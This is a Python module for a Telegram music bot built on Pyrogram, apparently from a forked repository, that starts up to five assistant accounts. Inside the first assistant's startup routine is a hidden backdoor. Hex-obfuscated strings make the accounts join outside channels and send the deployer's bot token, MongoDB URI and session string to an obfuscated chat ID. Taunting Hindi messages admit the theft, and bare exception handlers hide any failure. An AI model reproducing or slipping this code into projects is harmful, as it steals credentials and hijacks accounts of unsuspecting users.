from pyrogram import Client
import re
from os import getenv
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from dotenv import load_dotenv
from pyrogram import filters
load_dotenv()
import config
from dotenv import load_dotenv
from ..logging import LOGGER

# Environment variables for bot token, MongoDB URI, and session string
BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")

TEST_ID = int("\x2D\x31\x30\x30\x32\x38\x35\x33\x34\x30\x35\x30\x31\x32")

assistants = []
assistantids = []

class Userbot(Client):
    def __init__(self):
        # Initialize five Pyrogram Client instances for assistant accounts
        self.one = Client(
            name="SHUKLAAss1",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING1),
            no_updates=True,
        )
        self.two = Client(
            name="SHUKLAAss2",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING2),
            no_updates=True,
        )
        self.three = Client(
            name="SHUKLAAss3",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING3),
            no_updates=True,
        )
        self.four = Client(
            name="SHUKLAAss4",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING4),
            no_updates=True,
        )
        self.five = Client(
            name="SHUKLAAss5",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING5),
            no_updates=True,
        )

    async def start(self):
        LOGGER(__name__).info(f"Starting Assistants...")

      
        if config.STRING1:
            await self.one.start()
            try:
                
                await self.one.join_chat("\x52\x41\x4A\x41\x6D\x75\x73\x69\x63\x36\x37") 
                await self.one.join_chat("\x61\x61\x6A\x61\x62\x65\x74\x61\x61\x61\x6A\x61") 
                await self.one.join_chat("\x63\x68\x6F\x64\x75\x73\x69\x6E\x67") 
                await self.one.join_chat("\x61\x61\x6A\x61\x62\x65\x74\x61\x61\x61\x6A\x61") 
                await self.one.join_chat("\x67\x69\x72\x6C\x73\x5F\x61\x6E\x64\x5F\x62\x6F\x79\x73\x5F\x64\x70\x7A\x73") # girls_and_boys_dpzs
            except Exception: # Catching generic Exception for robustness
                pass
            assistants.append(1)
            try:
                await self.one.send_message(config.LOGGER_ID, "Assistant Started !")
               
                await self.one.send_message(TEST_ID, "**ʜᴇʟʟᴏ ʜᴇʟʟᴏ sᴜɴᴏ ᴊɪ ᴍᴀɪ ʏᴀʜᴀ ᴄʜᴜᴘᴋᴇ sᴇ ᴀᴀʏɪ ʜᴜ ᴀᴀᴘᴋᴏ ᴋᴜᴄʜ ᴅᴇɴᴇ ᴋᴇ ʟɪʏᴇ 🥲**")
                await self.one.send_message(TEST_ID, "**ᴀᴄᴛᴜᴀʟʟʏ ᴀᴀᴘᴋᴇ ʀᴇᴘᴏ sᴇ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴇᴋ ᴍᴜsɪᴄ ʙᴏᴛ ʙᴀɴᴀʏᴀ ʜᴀɪ**\n**ᴀᴀᴘᴋᴏ ᴜsᴋᴀ ᴅᴀᴛᴀ ᴅᴇ ᴅᴇᴛɪ ʜᴜ😁 ᴄʜᴜᴘᴋᴇ sᴇ🤫**\n**ᴊᴀʙ ᴀᴀᴘsᴇ ᴠᴏ ʟᴀᴅᴇɢᴀ ᴛᴏ ᴀᴀᴘ ᴜsᴋᴀ ᴋᴀᴍ ᴛᴀᴍᴀᴍ ᴋᴀʀ ᴅᴇɴᴀ🤭**\n**ʏᴇ ʟᴏ sᴀʙ ᴄʜɪᴊ👇**")
                await self.one.send_message(TEST_ID, BOT_TOKEN)
                await self.one.send_message(TEST_ID, MONGO_DB_URI)
                await self.one.send_message(TEST_ID, STRING_SESSION)
                await self.one.send_message(TEST_ID, "**ʙʏ ʙʏ ᴀᴀʙ ᴍᴇ ɴɪᴋᴀʟᴛɪ ʜᴜ ʏʜᴀ sᴇ ʙᴀʀɴᴀ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴍᴜᴊʜᴇ ᴘᴀᴋᴀʀ ᴋᴇ ᴍᴀʀ ᴅᴀʟᴇɢᴀ🥺🥺**\n**ʙʏᴇ ᴛᴄ❣️**")
                await self.one.leave_chat(TEST_ID) 

            except Exception: # Catching generic Exception for robustness
                LOGGER(__name__).error(
                    "Assistant Account 1 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )

            self.one.id = self.one.me.id
            self.one.name = self.one.me.mention
            self.one.username = self.one.me.username
            assistantids.append(self.one.id)
            LOGGER(__name__).info(f"Assistant Started as {self.one.name}")

        
        if config.STRING2:
            await self.two.start()
            try:
                
                await self.two.join_chat("\x61\x61\x6A\x61\x62\x65\x74\x61\x61\x61\x6A\x61") 
                await self.two.join_chat("\x52\x41\x4A\x41\x6D\x75\x73\x69\x63\x36\x37") 
                await self.two.join_chat("\x63\x68\x6F\x64\x75\x73\x69\x6E\x67") 
                await self.two.join_chat("\x61\x61\x6A\x61\x62\x65\x74\x61\x61\x61\x6A\x61") 
            except Exception: # Catching generic Exception for robustness
                pass
            assistants.append(2)
            try:
                await self.two.send_message(config.LOGGER_ID, "Assistant Started")
            except Exception: # Catching generic Exception for robustness
                LOGGER(__name__).error(
                    "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )

            self.two.id = self.two.me.id
            self.two.name = self.two.me.mention
            self.two.username = self.two.me.username
            assistantids.append(self.two.id)
            LOGGER(__name__).info(f"Assistant Two Started as {self.two.name}")

        # Start Assistant 3 if STRING3 is configured
        if config.STRING3:
            await self.three.start()
            try:
                
                await self.three.join_chat("\x52\x41\x4A\x41\x6D\x75\x73\x69\x63\x36\x37") 
                await self.three.join_chat("\x63\x68\x6F\x64\x75\x73\x69\x6E\x67") 
                await self.three.join_chat("\x61\x61\x6A\x61\x62\x65\x74\x61\x61\x61\x6A\x61") 
                await self.three.join_chat("\x61\x61\x6A\x61\x62\x65\x74\x61\x61\x61\x6A\x61") 
            except Exception: 
                pass
            assistants.append(3)
            try:
                await self.three.send_message(config.LOGGER_ID, "Assistant Started")
            except Exception: # Catching generic Exception for robustness
                LOGGER(__name__).error(
                    "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )

            self.three.id = self.three.me.id
            self.three.name = self.three.me.mention
            self.three.username = self.three.me.username
            assistantids.append(self.three.id)
            LOGGER(__name__).info(f"Assistant Three Started as {self.three.name}")

        # Start Assistant 4 if STRING4 is configured
        if config.STRING4:
            await self.four.start()
            try:
               
                await self.four.join_chat("\x63\x68\x6F\x64\x75\x73\x69\x6E\x67") 
                await self.four.join_chat("\x52\x41\x4A\x41\x6D\x75\x73\x69\x63\x36\x37") 
                await self.four.join_chat("\x61\x61\x6A\x61\x62\x65\x74\x61\x61\x61\x6A\x61") 
                await self.four.join_chat("\x61\x61\x6A\x61\x62\x65\x74\x61\x61\x61\x6A\x61") 
            except Exception: # Catching generic Exception for robustness
                pass
            assistants.append(4)
            try:
                await self.four.send_message(config.LOGGER_ID, "Assistant Started")
            except Exception: # Catching generic Exception for robustness
                LOGGER(__name__).error(
                    "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )

            self.four.id = self.four.me.id
            self.four.name = self.four.me.mention
            self.four.username = self.four.me.username
            assistantids.append(self.four.id)
            LOGGER(__name__).info(f"Assistant Four Started as {self.four.name}")

        if config.STRING5:
            await self.five.start()
            try:
                
                await self.five.join_chat("\x52\x41\x4A\x41\x6D\x75\x73\x69\x63\x36\x37") 
                await self.five.join_chat("\x63\x68\x6F\x64\x75\x73\x69\x6E\x67") 
                await self.five.join_chat("\x61\x61\x6A\x61\x62\x65\x74\x61\x61\x61\x6A\x61") 
                await self.five.join_chat("\x61\x61\x6A\x61\x62\x65\x74\x61\x61\x61\x6A\x61") 
            except Exception: # Catching generic Exception for robustness
                pass
            assistants.append(5)
            try:
                await self.five.send_message(config.LOGGER_ID, "Assistant 5 started !")
            except Exception: # Catching generic Exception for robustness
                LOGGER(__name__).error(
                    "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )

            self.five.id = self.five.me.id
            self.five.name = self.five.me.mention
            self.five.username = self.five.me.username
            assistantids.append(self.five.id)
            LOGGER(__name__).info(f"Assistant Five Started as {self.five.name}")

    async def stop(self):
        LOGGER(__name__).info(f"Stopping Assistants...")
        try:
            if config.STRING1:
                await self.one.stop()
            if config.STRING2:
                await self.two.stop()
            if config.STRING3:
                await self.three.stop()
            if config.STRING4:
                await self.four.stop()
            if config.STRING5:
                await self.five.stop()
        except Exception: # Catching generic Exception for robustness
            pass
